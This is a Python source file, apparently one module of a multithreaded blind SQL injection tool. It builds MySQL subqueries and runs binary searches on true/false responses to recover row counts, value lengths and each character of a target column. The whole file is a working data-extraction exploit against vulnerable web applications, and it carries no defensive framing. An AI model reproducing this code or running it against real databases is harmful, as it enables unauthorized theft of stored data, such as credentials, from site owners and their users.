import threading
import core

class ValueCharacterTester(threading.Thread):
    def __init__(self, database, table, column, position, index):
        self.database = database
        self.table = table
        self.column = column
        super(ValueCharacterTester, self).__init__()
        self.position = position
        self.index = index
        self.character = -1

    def run(self):
        self.character = self.get_char()
        while self.character == -1:
            self.get_char()

    def test_character(self, character, position, operation=">="):
        injection_string = "(SELECT count(*) FROM (SELECT %s from %s.%s LIMIT %d,1) as temp where ASCII(SUBSTRING(%s, %d, 1))%s%d)" % (self.column, self.database, self.table, self.index - 1, self.column, position, operation, character)
        return core.check_truth(injection_string)

    def get_char(self):
        min_char = 1
        max_char = 128
        character = (min_char + max_char) / 2

        while True:
            length_check = self.test_character(character, self.position)
            core.println("Checked character %d for index %d for position %d: %s" % (character, self.index, self.position, length_check))
            if length_check:
                min_char = character
            else:
                max_char = character - 1

            if min_char == max_char or max_char - min_char == 1:
                min_length_check = self.test_character(min_char, self.position, "=")
                if min_length_check:
                    core.println("Found character %d for index %d for position %d" % (min_char, self.index, self.position))
                    return min_char
                max_length_check = self.test_character(max_char, self.position, "=")
                if max_length_check:
                    core.println("Found character %d for index %d for position %d" % (max_char, self.index, self.position))
                    return max_char
                return -1

            character = (min_char + max_char) / 2

        return -1


class ValueBruteForcer(threading.Thread):
    def __init__(self, database, table, column, index):
        super(ValueBruteForcer, self).__init__()
        self.database = database
        self.table = table
        self.column = column
        self.character_count = -1
        self.found_characters = ""
        self.index = index

    def get_value(self):
        return self.found_characters

    def run(self):
        self.get_characters()

    def get_characters(self):
        self.found_characters = ""
        self.character_count = self.get_length()

        for j in range((self.character_count // 10) + 1):
            value_character_testers = []
            for i in range(j * 10, (j+1) * 10):
                if i < self.character_count:
                    value_character_tester = ValueCharacterTester(self.database, self.table, self.column, i + 1, self.index)
                    value_character_tester.start()
                    # value_character_tester.join()
                    value_character_testers.append(value_character_tester)

            for value_character_tester in value_character_testers:
                value_character_tester.join()
                self.found_characters += chr(value_character_tester.character)

        core.println("Found value for row %d column %s is %s" % (self.index, self.column, self.found_characters))

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) FROM (SELECT %s from %s.%s LIMIT %d,1) as temp where length(%s)%s%d)" %(self.column, self.database, self.table, self.index - 1, self.column, operation, count)
        return core.check_truth(injection_string)


    def get_length(self):
        min_count = 1
        max_count = 64

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked value length for index %d count %d: %s" % (self.index, count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found value length for index %d count %d" % (self.index, min_count))
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found value length for index %d count %d" % (self.index, max_count))
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

class ValueDetector:
    def __init__(self, database, table, column):
        self.database = database
        self.table = table
        self.column = column
        self.values = []

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(%s) from %s.%s)%s%d" %(self.column, self.database, self.table, operation, count)
        return core.check_truth(injection_string)

    def get_count(self):
        min_count = 1
        max_count = 1024

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked count %d: %s" % (count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found count %d" % min_count)
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found count %d" % max_count)
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

    def get_values(self):
        # value_count = self.get_count()
        value_count = 5
        core.println("Found %d values\n" % value_count)

        value_brute_forcers = []
        for i in range(value_count):
            value_brute_forcer = ValueBruteForcer(self.database, self.table, self.column, i + 1)
            value_brute_forcer.start()
            value_brute_forcer.join()
            value_brute_forcers.append(value_brute_forcer)

        self.values = []

        for value_brute_forcer in value_brute_forcers:
            # value_brute_forcer.join()
            core.println("Found value: %s" % value_brute_forcer.get_value())
            self.values.append(value_brute_forcer.get_value())


if __name__ == '__main__':
    database = ""
    table = ""
    column = ""
    core.read_cache()
    value_detector = ValueDetector(database, table, column)
    value_detector.get_values()